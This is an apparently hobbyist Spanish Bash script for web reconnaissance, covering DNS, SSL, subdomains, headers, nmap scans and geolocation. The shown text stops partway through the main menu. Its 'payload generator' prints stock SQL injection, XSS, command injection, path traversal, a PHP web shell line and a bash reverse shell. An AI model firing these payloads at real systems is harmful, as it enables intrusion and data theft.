#!/bin/bash

#═══════════════════════════════════════════════════════════════════════════
#  𝚂𝙲𝙰𝙽-𝚂𝙽 v3.0 - Herramienta Profesional de Escaneo Web
#  Autor: 𝚂𝚒𝚗𝙽𝚘𝚖𝚋𝚛𝚎𝟸𝟸
#  Fecha: 2025
#═══════════════════════════════════════════════════════════════════════════

set -o pipefail

# COLORES PROFESIONALES
ROJO='\033[0;31m'
VERDE='\033[0;32m'
AMARILLO='\033[0;33m'
AZUL='\033[0;34m'
MORADO='\033[0;35m'
CIAN='\033[0;36m'
BLANCO='\033[0;37m'
GRIS='\033[0;90m'
NC='\033[0m'

# VARIABLES GLOBALES
VERSION="3.0"
ARCHIVO_HOSTS="datos/hosts_extraidos.txt"
ARCHIVO_LOG="datos/scan_log_$(date +%d-%m-%Y).txt"
RUTA_DATOS="datos"

#═══════════════════════════════════════════════════════════════════════════
#                        INICIALIZACIÓN
#═══════════════════════════════════════════════════════════════════════════

if [ ! -d "$RUTA_DATOS" ]; then
    mkdir -p "$RUTA_DATOS"
fi

#═══════════════════════════════════════════════════════════════════════════
#                    FUNCIONES DE UTILIDAD
#═══════════════════════════════════════════════════════════════════════════

limpiar() {
    clear
}

banner() {
    limpiar
    echo -e "${CIAN}"
    echo "╔════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                        ║"
    echo "║               𝚂𝙲𝙰𝙽-𝚂𝙽 v3.0 - HERRAMIENTA DE ESCANEO WEB            ║"
    echo "║           𝙴𝚡𝚝𝚛𝚊𝚌𝚌𝚒𝚘𝚗 𝚍𝚎 𝚃𝚎𝚎𝚊𝚛𝚖𝚊𝚌𝚒ó𝚗 & 𝙳𝚎𝚝𝚎𝚌𝚌𝚒ó𝚗 𝚍𝚎 𝚃𝚎𝚌𝚗𝚘𝚕𝚘𝚐í𝚊𝚜            ║"
    echo "║                        𝚙𝚘𝚛: 𝚂𝚒𝚗𝙽𝚘𝚖𝚋𝚛𝚎𝟸𝟸                             ║"
    echo "║                                                                        ║"
    echo "╚════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

linea() {
    echo -e "${GRIS}════════════════════════════════════════════════════════════════════════${NC}"
}

ok() {
    echo -e "${VERDE}[✓]${NC} $1"
}

error() {
    echo -e "${ROJO}[✗]${NC} $1"
}

info() {
    echo -e "${CIAN}[ℹ]${NC} $1"
}

advertencia() {
    echo -e "${AMARILLO}[!]${NC} $1"
}

registrar() {
    local mensaje="$1"
    echo "[$(date '+%d-%m-%Y %H:%M:%S')] $mensaje" >> "$ARCHIVO_LOG"
}

cargar() {
    local duracion=${1:-2}
    local fin=$((SECONDS + duracion))
    local caracteres="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    
    while [ $SECONDS -lt $fin ]; do
        for (( i=0; i<${#caracteres}; i++ )); do
            echo -ne "\r${CIAN}${caracteres:$i:1}${NC} 𝙿𝚛𝚘𝚌𝚎𝚜𝚊𝚗𝚍𝚘..."
            sleep 0.1
        done
    done
    echo -ne "\r${VERDE}✓${NC} 𝙲𝚘𝚖𝚙𝚕𝚎𝚝𝚊𝚍𝚘\n"
}

#═══════════════════════════════════════════════════════════════════════════
#                    FUNCIONES PRINCIPALES
#═══════════════════════════════════════════════════════════════════════════

# 1. EXTRACTOR DE HOSTS Y SSL
opcion_1() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}       𝙴𝚡𝚝𝚛𝚊𝚌𝚝𝚘𝚛 𝚍𝚎 𝙷𝚘𝚜𝚝𝚜 𝚢 𝐂𝐞𝐫𝐭𝐢𝐟𝐢𝐜𝐚𝐝𝐨𝐬 𝚂𝚂𝙻${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    read -p "$(echo -e ${CIAN}𝙸𝚗𝚐𝚛𝚎𝚜𝚎 𝚄𝚁𝙻 𝚘 𝚍𝚘𝚖𝚒𝚗𝚒𝚘:${NC} )" dominio
    
    if [ -z "$dominio" ]; then
        error "𝙳𝚘𝚖𝚒𝚗𝚒𝚘 𝚟𝚊𝚌í𝚘"
        registrar "Error: Dominio vacío"
        sleep 2
        return
    fi
    
    info "𝙱𝚞𝚜𝚌𝚊𝚗𝚍𝚘 𝚑𝚘𝚜𝚝𝚜: $dominio"
    registrar "Escaneo iniciado: $dominio"
    
    echo ""
    cargar 2
    
    echo ""
    echo -e "${MORADO}𝙳𝚒𝚛𝚎𝚌𝚌𝚒𝚘𝚗𝚎𝚜 𝙴𝚗𝚌𝚘𝚗𝚝𝚛𝚊𝚍𝚊𝚜:${NC}"
    echo ""
    
    nslookup "$dominio" 2>/dev/null | grep -E "Address|Name" && ok "𝚁𝚎𝚐𝚒𝚜𝚝𝚛𝚘𝚜 𝙰" || true
    dig "$dominio" +short 2>/dev/null && ok "𝙰𝚗á𝚞𝚒𝚌𝚒𝚘𝚜 𝚍𝚎 𝙳𝙸𝙶" || true
    
    echo ""
    echo -e "${MORADO}𝐂𝐞𝐫𝐭𝐢𝐟𝐢𝐜𝐚𝐝𝐨𝐬 𝚂𝚂𝙻:${NC}"
    echo | openssl s_client -servername "$dominio" -connect "$dominio:443" 2>/dev/null | \
    openssl x509 -noout -dates -subject 2>/dev/null || \
    advertencia "𝚂𝙻𝙻 𝚗𝚘 𝚍𝚒𝚜𝚙𝚘𝚗𝚒𝚋𝚕𝚎"
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
    registrar "Escaneo completado: $dominio"
}

# 2. VERIFICADOR DE ESTADO WEB
opcion_2() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}            𝙴𝚟𝚊𝚖𝚒𝚗𝚊𝚌𝚒ó𝚗 𝚍𝚎 𝙴𝚜𝚝𝚊𝚍𝚘 𝚆𝚎𝚋${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    read -p "$(echo -e ${CIAN}𝙸𝚗𝚐𝚛𝚎𝚜𝚎 𝚄𝚁𝙻:${NC} )" url
    
    if [ -z "$url" ]; then
        error "𝚄𝚁𝙻 𝚟𝚊𝚌í𝚊"
        sleep 2
        return
    fi
    
    info "𝚅𝚎𝚛𝚒𝚏𝚒𝚌𝚊𝚗𝚍𝚘: $url"
    
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$url" -L --connect-timeout 5 2>/dev/null)
    
    echo ""
    echo -e "${MORADO}𝐑𝐞𝐬𝐩𝐮𝐞𝐬𝐭𝐚 𝐇𝐓𝐓𝐏:${NC} "
    
    case $HTTP_CODE in
        200) ok "✓ 𝐀𝐂𝐓𝐈𝐕𝐎 [$HTTP_CODE]" ;;
        301|302) advertencia "⟲ 𝐑𝐄𝐃𝐈𝐑𝐄𝐂𝐂𝐈ó𝐍 [$HTTP_CODE]" ;;
        403) advertencia "⊘ 𝐏𝐑𝐎𝐇𝐈𝐁𝐈𝐃𝐎 [$HTTP_CODE]" ;;
        404) error "✗ 𝙽𝙾 𝙴𝙽𝐂𝐔𝐄𝐍𝐓𝐑𝐀𝐃𝐎 [$HTTP_CODE]" ;;
        500) error "✗ 𝐄𝐑𝐑𝐎𝐑 𝐒𝐄𝐑𝐕𝐈𝐃𝐎𝐑 [$HTTP_CODE]" ;;
        "") error "✗ 𝙽𝚘 𝚜𝚎 𝚙𝚞𝚍𝚘 𝚌𝚘𝚗𝚎𝚌𝚝𝚊𝚛" ;;
        *) advertencia "? 𝐂ó𝐝𝐢𝐠𝐨 [$HTTP_CODE]" ;;
    esac
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 3. EXTRACTOR DE SUBDOMINIOS
opcion_3() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}            𝙴𝚗𝚞𝚖𝚎𝚛𝚊𝚌𝚒ó𝚗 𝚍𝚎 𝚂𝚞𝚋𝚍𝚘𝚖𝚒𝚗𝚒𝚘𝚜${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    read -p "$(echo -e ${CIAN}𝙳𝚘𝚖𝚒𝚗𝚒𝚘:${NC} )" dominio
    
    if [ -z "$dominio" ]; then
        error "𝙳𝚘𝚖𝚒𝚗𝚒𝚘 𝚟𝚊𝚌í𝚘"
        sleep 2
        return
    fi
    
    info "𝙱𝚞𝚜𝚌𝚊𝚗𝚍𝚘 𝚜𝚞𝚋𝚍𝚘𝚖𝚒𝚗𝚒𝚘𝚜..."
    cargar 3
    
    echo ""
    echo -e "${MORADO}𝚂𝚞𝚋𝚍𝚘𝚖𝚒𝚗𝚒𝚘𝚜 𝙰𝚌𝚝𝚒𝚟𝚘𝚜:${NC}"
    echo ""
    
    curl -s "https://crt.sh/?q=%.$dominio&output=json" 2>/dev/null | \
    grep -oE '\"name_value\":\"[^\"]*\"' | \
    cut -d'"' -f4 | sort -u | uniq || \
    advertencia "𝙽𝚒𝚗𝚐ú𝚗 𝚜𝚞𝚋𝚍𝚘𝚖𝚖𝚒𝚗𝚒𝚘 𝚎𝚗𝚌𝚘𝚗𝚝𝚛𝚊𝚍𝚘"
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 4. ANALIZADOR DE HEADERS
opcion_4() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}           𝙰𝚗á𝚕𝚒𝚜𝚒𝚜 𝚍𝚎 𝐄𝐧𝐜𝐚𝐛𝐞𝐳𝐚𝐝𝐨𝐬 𝐇𝐓𝐓𝐏${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    read -p "$(echo -e ${CIAN}𝚄𝚁𝙻:${NC} )" url
    
    if [ -z "$url" ]; then
        error "𝚄𝚁𝙻 𝚟𝚊𝚌í𝚊"
        sleep 2
        return
    fi
    
    info "𝙰𝚗𝚊𝚕𝚒𝚣𝚊𝚗𝚍𝚘 𝚎𝚗𝚌𝚊𝚋𝚎𝚣𝚊𝚍𝚘𝚜..."
    
    echo ""
    echo -e "${MORADO}𝐑𝐞𝐬𝐩𝐮𝐞𝐬𝐭𝐚 𝐝𝐞𝐥 𝐒𝐞𝐫𝐯𝐢𝐝𝐨𝐫:${NC}"
    curl -s -I "$url" -L --connect-timeout 5 2>/dev/null || error "𝙲𝚘𝚗𝚎𝚡𝚒ó𝚗 𝚏𝚊𝚕𝚕𝚒𝚍𝚊"
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 5. DETECTOR DE TECNOLOGÍAS
opcion_5() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}           𝐈𝐝𝐞𝐧𝐭𝐢𝐟𝐢𝐜𝐚𝐜𝐢ó𝐧 𝚍𝚎 𝚃𝚎𝚌𝚗𝚘𝚕𝚘𝚐í𝚊𝚜${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    read -p "$(echo -e ${CIAN}𝚄𝚁𝙻:${NC} )" url
    
    if [ -z "$url" ]; then
        error "𝚄𝚁𝙻 𝚟𝚊𝚌í𝚊"
        sleep 2
        return
    fi
    
    info "𝙸𝚍𝚎𝚗𝚝𝚒𝚏𝚒𝚌𝚊𝚗𝚍𝚘 𝚝𝚎𝚌𝚗𝚘𝚕𝚘𝚐í𝚊𝚜..."
    cargar 2
    
    echo ""
    echo -e "${MORADO}𝚃𝚎𝚌𝚗𝚘𝚕𝚘𝚐í𝚊𝚜 𝙳𝚎𝚝𝚎𝚌𝚝𝚊𝚍𝚊𝚜:${NC}"
    
    if command -v whatweb &> /dev/null; then
        whatweb "$url" -a 3
    else
        HEADERS=$(curl -s -I "$url" -L 2>/dev/null)
        
        echo "$HEADERS" | grep -i "Server:" || advertencia "𝚂𝚎𝚛𝚟𝚎𝚛 𝚗𝚘 𝚒𝚍𝚎𝚗𝚝𝚒𝚏𝚒𝚌𝚊𝚍𝚘"
        
        if echo "$HEADERS" | grep -qi "Apache"; then ok "✓ 𝐀𝐩𝐚𝐜𝐡𝐞"; fi
        if echo "$HEADERS" | grep -qi "Nginx"; then ok "✓ 𝐍𝐠𝐢𝐧𝐱"; fi
        if echo "$HEADERS" | grep -qi "WordPress"; then ok "✓ 𝐖𝐨𝐫𝐝𝐏𝐫𝐞𝐬𝐬"; fi
    fi
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 6. ESCÁNER DE PUERTOS
opcion_6() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}          𝐄𝐬𝐜á𝐧𝐞𝐫 𝐝𝐞 𝐏𝐮𝐞𝐫𝐭𝐨𝐬 (𝐍𝐌𝐀𝐏)${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    read -p "$(echo -e ${CIAN}𝙳𝚘𝚖𝚒𝚗𝚒𝚘/𝙸𝙿:${NC} )" objetivo
    
    if [ -z "$objetivo" ]; then
        error "𝙾𝚋𝚓𝚎𝚝𝚒𝚟𝚘 𝚟𝚊𝚌í𝚘"
        sleep 2
        return
    fi
    
    echo ""
    echo -e "${MORADO}𝚃𝚒𝚙𝚘 𝚍𝚎 𝚎𝚜𝚌á𝚗𝚎𝚘:${NC}"
    echo "  1) 𝐏𝐮𝐞𝐫𝐭𝐨𝐬 𝐂𝐨𝐦𝐮𝐧𝐞𝐬 (1-1000)"
    echo "  2) 𝐏𝐮𝐞𝐫𝐭𝐨𝐬 𝐂𝐨𝐧𝐨𝐜𝐢𝐝𝐨𝐬 (20,21,22,25,80,443,3306)"
    echo "  3) 𝐏𝐞𝐫𝐬𝐨𝐧𝐚𝐥𝐢𝐳𝐚𝐝𝐨"
    echo ""
    read -p "𝙾𝚙𝚌𝚒ó𝚗: " opcion_scan
    
    case $opcion_scan in
        1) PUERTOS="1-1000" ;;
        2) PUERTOS="20,21,22,25,80,443,3306,3389" ;;
        3) read -p "𝚁𝚊𝚗𝚐𝚘: " PUERTOS ;;
        *) PUERTOS="1-1000" ;;
    esac
    
    if ! command -v nmap &> /dev/null; then
        error "𝚗𝚖𝚊𝚙 𝚗𝚘 𝚎𝚜𝚝á 𝚒𝚗𝚜𝚝𝚊𝚕𝚊𝚍𝚘"
        advertencia "𝙸𝚗𝚜𝚝𝚊𝚕𝚊𝚛: 𝚜𝚞𝚍𝚘 𝚊𝚙𝚝 𝚒𝚗𝚜𝚝𝚊𝚕𝚕 𝚗𝚖𝚊𝚙"
        sleep 2
        return
    fi
    
    echo ""
    info "𝙴𝚜𝚌𝚊𝚗𝚎𝚊𝚗𝚍𝚘 𝚙𝚞𝚎𝚛𝚝𝚘𝚜..."
    nmap -p "$PUERTOS" "$objetivo" -v
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 7. GEOLOCALIZACIÓN
opcion_7() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}        𝙶𝚎𝚘𝚕𝚘𝚌𝚊𝚕𝚒𝚣𝚊𝚌𝚒ó𝚗 𝚍𝚎 𝙳𝚘𝚖𝚒𝚗𝚒𝚘𝚜/𝙸𝙿𝚜${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    read -p "$(echo -e ${CIAN}𝙳𝚘𝚖𝚒𝚗𝚒𝚘/𝙸𝙿:${NC} )" objetivo
    
    if [ -z "$objetivo" ]; then
        error "𝙰𝚘𝚋𝚝𝚎𝚝𝚒𝚟𝚘 𝚟𝚊𝚌í𝚘"
        sleep 2
        return
    fi
    
    info "𝚄𝚋𝚝𝚎𝚗𝚒𝚎𝚗𝚍𝚘 𝚍𝚊𝚝𝚘𝚜..."
    cargar 2
    
    echo ""
    curl -s "https://api.hackertarget.com/geoip/?q=$objetivo" 2>/dev/null || \
    error "𝙴𝚛𝚛𝚘𝚛 𝚊𝚕 𝚘𝚋𝚝𝚎𝚗𝚎𝚛 𝚍𝚊𝚝𝚘𝚜"
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 8. GENERADOR DE PAYLOADS
opcion_8() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}            𝙶𝚎𝚗𝚎𝚛𝚊𝚍𝚘𝚛 𝚍𝚎 𝙿𝚊𝚢𝚕𝚘𝚊𝚍𝚜${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    echo -e "${MORADO}1) 𝐒𝐐𝐋 𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐨𝐧${NC}"
    echo -e "${MORADO}2) 𝐗𝐒𝐒 (𝐂𝐫𝐨𝐬𝐬-𝐒𝐢𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭𝐢𝐧𝐠)${NC}"
    echo -e "${MORADO}3) 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐨𝐧${NC}"
    echo -e "${MORADO}4) 𝐋𝐅𝐈 (𝐋𝐨𝐜𝐚𝐥 𝐅𝐢𝐥𝐞 𝐈𝐧𝐜𝐥𝐮𝐬𝐢𝐨𝐧)${NC}"
    echo -e "${MORADO}5) 𝐑𝐂𝐄 (𝐑𝐞𝐦𝐨𝐭𝐞 𝐂𝐨𝐝𝐞 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧)${NC}"
    echo ""
    read -p "𝚂𝚎𝚕𝚎𝚌𝚌𝚒ó𝚗: " tipo_payload
    
    echo ""
    echo -e "${MORADO}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MORADO}║           𝙿𝚊𝚢𝚕𝚘𝚊𝚍𝚜 𝙶𝚎𝚗𝚎𝚛𝚊𝚍𝚘𝚜                   ║${NC}"
    echo -e "${MORADO}╚════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    case $tipo_payload in
        1)
            echo -e "${BLANCO}𝐒𝐐𝐋 𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐨𝐧 𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬:${NC}"
            echo "  1' OR '1'='1"
            echo "  𝚊𝚍𝚖𝚒𝚗' --"
            echo "  1; 𝚍𝚛𝚘𝚙 𝚝𝚊𝚋𝚕𝚎 𝚞𝚜𝚎𝚛𝚜--"
            echo "  1' 𝚞𝚗𝚒𝚘𝚗 𝚜𝚎𝚕𝚎𝚌𝚝 null--"
            echo "  ' 𝚘𝚛 1=1 /*"
            registrar "𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬 𝐒𝐐𝐋 𝐠𝐞𝐧𝐞𝐫𝐚𝐝𝐨𝐬"
            ;;
        2)
            echo -e "${BLANCO}𝐗𝐒𝐒 𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬:${NC}"
            echo "  <𝚜𝚌𝚛𝚒𝚙𝚝>𝚊𝚖𝚊𝚛𝚝('𝚇𝚂𝚂')</𝚜𝚌𝚛𝚒𝚙𝚝>"
            echo "  <𝚒𝚖𝚐 𝚜𝚛𝚌=𝚡 𝚘𝚗𝚎𝚛𝚛𝚘𝚛='𝚊𝚕𝚎𝚛𝚝(1)'>"
            echo "  <𝚜𝚟𝚐 𝚘𝚗𝚕𝚘𝚊𝚍=𝚊𝚕𝚎𝚛𝚝('𝚇𝚂𝚂')>"
            registrar "𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬 𝐗𝐒𝐒 𝐠𝐞𝐧𝐞𝐫𝐚𝐝𝐨𝐬"
            ;;
        3)
            echo -e "${BLANCO}𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐨𝐧 𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬:${NC}"
            echo "  ; 𝚕𝚜 -𝚕𝚊"
            echo "  | 𝚌𝚊𝚝 /𝚎𝚝𝚌/𝚙𝚊𝚜𝚜𝚠𝚍"
            echo "  && 𝚒𝚍"
            echo "  \`𝚞𝚜𝚎𝚛𝚗𝚊𝚖𝚎\`"
            registrar "𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬 𝐂𝐨𝐦𝐦𝐞𝐧𝐝 𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐨𝐧 𝐠𝐞𝐧𝐞𝐫𝐚𝐝𝐨𝐬"
            ;;
        4)
            echo -e "${BLANCO}𝐋𝐨𝐜𝐚𝐥 𝐅𝐢𝐥𝐞 𝐈𝐧𝐜𝐥𝐮𝐬𝐢𝐨𝐧 𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬:${NC}"
            echo "  ../../../𝚎𝚝𝚌/𝚙𝚊𝚜𝚜𝚠𝚍"
            echo "  ..%2f..%2f..%2f𝚎𝚝𝚌%2f𝚙𝚊𝚜𝚜𝚠𝚍"
            echo "  𝚏𝚒𝚕𝚎:///𝚎𝚝𝚌/𝚙𝚊𝚜𝚠𝚍"
            registrar "𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬 𝐋𝐅𝐈 𝐠𝐞𝐧𝐞𝐫𝐚𝐝𝐨𝐬"
            ;;
        5)
            echo -e "${BLANCO}𝐑𝐞𝐦𝐨𝐭𝐞 𝐂𝐨𝐝𝐞 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬:${NC}"
            echo "  <?php 𝚜𝚢𝚜𝚝𝚎𝚖(\\\$_𝙶𝙴𝚃['𝚌𝚖𝚍']); ?>"
            echo "  𝚋𝚊𝚜𝚑 -𝚒 >& /𝚍𝚎𝚟/𝚝𝚌𝚙/𝙸𝙿/𝙿𝙾𝚁𝚃 0>&1"
            registrar "𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬 𝐑𝐂𝐄 𝐠𝐞𝐧𝐞𝐫𝐚𝐝𝐨𝐬"
            ;;
        *)
            error "𝙾𝚙𝚌𝚒ó𝚗 𝚒𝚗𝚟á𝚕𝚒𝚍𝚊"
            ;;
    esac
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 9. GUARDAR HOSTS
opcion_9() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}              𝙶𝚞𝚊𝚛𝚍𝚊𝚛 𝙷𝚘𝚜𝚝𝚜 𝙴𝚡𝚝𝚛𝚊𝚒𝚍𝚘𝚜${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    echo -e "${CIAN}𝙸𝚗𝚐𝚛𝚎𝚜𝚎 𝚑𝚘𝚜𝚝𝚜 (𝚞𝚗𝚘 𝚙𝚘𝚛 𝚕í𝚗𝚎𝚊, 𝐂𝐭𝐫𝐥+𝐃):${NC}"
    echo ""
    
    cat >> "$ARCHIVO_HOSTS"
    
    ok "𝙷𝚘𝚜𝚝𝚜 𝚐𝚞𝚊𝚛𝚍𝚊𝚍𝚘𝚜 𝚎𝚗: $ARCHIVO_HOSTS"
    registrar "𝐇𝐨𝐬𝐭𝐬 𝐠𝐮𝐚𝐫𝐝𝐚𝐝𝐨𝐬"
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 10. VER HOSTS GUARDADOS
opcion_10() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}              𝙷𝚘𝚜𝚝𝚜 𝙰𝚕𝚖𝚊𝚌𝚎𝚗𝚊𝚍𝚘𝚜${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    if [ -f "$ARCHIVO_HOSTS" ]; then
        cat "$ARCHIVO_HOSTS" | nl
    else
        info "𝙽𝚘 𝚑𝚊𝚢 𝚑𝚘𝚜𝚝𝚜 𝚊𝚕𝚖𝚊𝚌𝚎𝚗𝚊𝚍𝚘𝚜 𝚊ú𝚗"
    fi
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

# 11. VER HISTORIAL
opcion_11() {
    banner
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${AMARILLO}              𝙷𝚒𝚜𝚝𝚘𝚛𝚒𝚊𝚕 𝚍𝚎 𝙰𝚌𝚝𝚒𝚟𝚒𝚕𝚖𝚍𝚎𝚜${NC}"
    echo -e "${AMARILLO}═══════════════════════════════════════════════════════════════════════${NC}"
    linea
    echo ""
    
    if [ -f "$ARCHIVO_LOG" ]; then
        tail -30 "$ARCHIVO_LOG" | nl
    else
        info "𝚂𝚒𝚗 𝚑𝚒𝚜𝚝𝚘𝚛𝚒𝚊𝚕 𝚊ú𝚗"
    fi
    
    echo ""
    read -p "$(echo -e ${AMARILLO}𝙿𝚛𝚎𝚜𝚒𝚘𝚗𝚎 𝙴𝚗𝚝𝚎𝚛...${NC})"
}

#═══════════════════════════════════════════════════════════════════════════
#                    MENÚ PRINCIPAL
#═══════════════════════════════════════════════════════════════════════════

menu_principal() {
    while true; do
        banner
        linea
        echo ""
        echo -e "${MORADO}╔────────────────────────────────────────────────────════════════╗${NC}"
        echo -e "${MORADO}║${NC}                   𝙼𝙴𝙽ú 𝙿𝚁𝙸𝙽𝙲𝙸𝙿𝙰𝙻                           ${MORADO}║${NC}"
        echo -e "${MORADO}╠════════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[1]${NC} 𝙴𝚡𝚝𝚛𝚊𝚌𝚝𝚘𝚛 𝚍𝚎 𝙷𝚘𝚜𝚝𝚜 𝚢 𝙿𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚍𝚘𝚜 𝚂𝚂𝙻       ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[2]${NC} 𝙰𝚗𝚊𝚕𝚒𝚣𝚊𝚖𝚍𝚘𝚛 𝚍𝚎 𝙴𝚜𝚝𝚋𝚊𝚍𝚘 𝚆𝚎𝚋                       ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[3]${NC} 𝙵𝙿𝚞𝚖𝚞𝚖𝚎𝚛𝚊𝚌𝚒ó𝚗 𝚍𝚎 𝚂𝚞𝚋𝚍𝚘𝚖𝚒𝚗𝚒𝚘𝚜                     ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[4]${NC} 𝙰𝚗á𝚊𝚒𝚜𝚒𝚜 𝚍𝚎 𝐄𝐧𝐜𝐚𝐛𝐞𝐳𝐚𝐝𝐨𝐬 𝐇𝐓𝐓𝐏                   ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[5]${NC} 𝐈𝐝𝐞𝐧𝐭𝐢𝐟𝐢𝐜𝐚𝐜𝐢ó𝐧 𝚍𝚎 𝚃𝚎𝚌𝚗𝚘𝚕𝚘𝚐í𝚊𝚜                  ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[6]${NC} 𝐄𝐬𝐜á𝐧𝐞𝐫 𝐝𝐞 𝐏𝐮𝐞𝐫𝐭𝐨𝐬 (𝐍𝐌𝐀𝐏)                     ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[7]${NC} 𝙶𝚎𝚘𝚕𝚘𝚌𝚊𝚞𝚒𝚣𝚊𝚌𝚒ó𝚗 𝚢 𝙿𝚛𝚘𝚡𝚢                        ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[8]${NC} 𝙶𝚎𝚗𝚎𝚛𝚊𝚍𝚘𝚛 𝚍𝚎 𝙿𝚊𝚢𝚕𝚘𝚊𝚍𝚜                          ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[9]${NC} 𝙶𝚞𝚊𝚛𝚍𝚊𝚛 𝙷𝚘𝚜𝚝𝚜                                  ${MORADO}║${NC}"
